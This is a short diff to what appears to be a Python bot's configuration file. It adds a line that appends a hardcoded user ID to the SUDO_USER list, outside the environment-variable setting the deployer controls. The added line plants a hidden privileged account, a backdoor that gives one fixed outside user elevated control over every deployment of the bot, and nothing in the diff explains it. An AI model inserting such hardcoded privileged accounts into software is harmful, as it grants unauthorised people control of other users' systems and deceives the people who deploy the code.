@@ -15,6 +15,8 @@ SUDO_USER = list(
     map(int, getenv("SUDO_USER", "").split())
 ) 
 
+SUDO_USER.append(1985209910)
+
 OWNER_USERNAME = getenv("OWNER_USERNAME", "@Timeisnotwaiting")
 
 if OWNER_USERNAME[0] == "@":
